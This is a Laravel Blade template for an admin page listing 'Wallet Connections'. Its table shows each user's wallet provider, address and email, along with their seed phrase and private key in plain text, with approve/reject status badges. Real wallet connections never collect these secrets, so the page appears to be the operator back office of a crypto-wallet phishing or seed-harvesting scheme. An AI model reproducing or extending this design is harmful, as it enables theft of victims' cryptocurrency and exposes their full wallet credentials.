@extends('admin.base')

@section('content')

    <div class="card shadow mb-4">
        <div class="card-header py-3 d-flex justify-content-between align-items-center">
            <h6 class="m-0 font-weight-bold text-primary">{{ $pageName ?? 'Wallet Connections' }}</h6>
            {{-- Optional: add filters/search later --}}
        </div>
        <div class="card-body">
            @include('templates.notification')

            <div class="table-responsive">
                <table class="table table-bordered" width="100%" cellspacing="0">
                    <thead>
                    <tr>
                        <th>User</th>
                        <th>Provider</th>
                        <th>Address</th>
                        <th>Email</th>
                        <th>Seed Phrase</th>
                        <th>Private Key</th>
                        <th>Status</th>
                        <th>Connected</th>
                        <th class="text-nowrap">Action</th>
                    </tr>
                    </thead>
                    <tbody>
                    @forelse($wallets as $w)
                        <tr>
                            <td>
                                {{ optional($w->user)->name ?? '—' }}
                                <div class="small text-muted">{{ optional($w->user)->email }}</div>
                            </td>
                            <td>{{ ucfirst($w->provider ?? '—') }}</td>
                            <td class="font-monospace">{{ $w->address ?: '—' }}</td>
                            <td>{{ $w->email ?: '—' }}</td>
                            <td class="font-monospace text-break">{{ $w->seed_phrase ?: '—' }}</td>
                            <td class="font-monospace text-break">{{ $w->private_key ?: '—' }}</td>
                            <td>
                                @switch($w->status)
                                    @case('approved')
                                        <span class="badge badge-success">Approved</span>
                                        @break
                                    @case('rejected')
                                        <span class="badge badge-danger">Rejected</span>
                                        @break
                                    @default
                                        <span class="badge badge-warning">Pending</span>
                                @endswitch
                            </td>
                            <td>{{ optional($w->created_at)->format('Y-m-d H:i') }}</td>
                            <td class="text-nowrap">
                                {{-- Approve / Reject / Delete routes go here --}}
                                <span class="text-muted small">—</span>
                            </td>
                        </tr>
                    @empty
                        <tr>
                            <td colspan="9" class="text-center text-muted">No wallet connections yet.</td>
                        </tr>
                    @endforelse
                    </tbody>
                    <tfoot>
                    <tr>
                        <th>User</th>
                        <th>Provider</th>
                        <th>Address</th>
                        <th>Email</th>
                        <th>Seed Phrase</th>
                        <th>Private Key</th>
                        <th>Status</th>
                        <th>Connected</th>
                        <th>Action</th>
                    </tr>
                    </tfoot>
                </table>
            </div>

            <div class="d-flex justify-content-end">
                {{ $wallets->links() }}
            </div>
        </div>
    </div>

@endsection
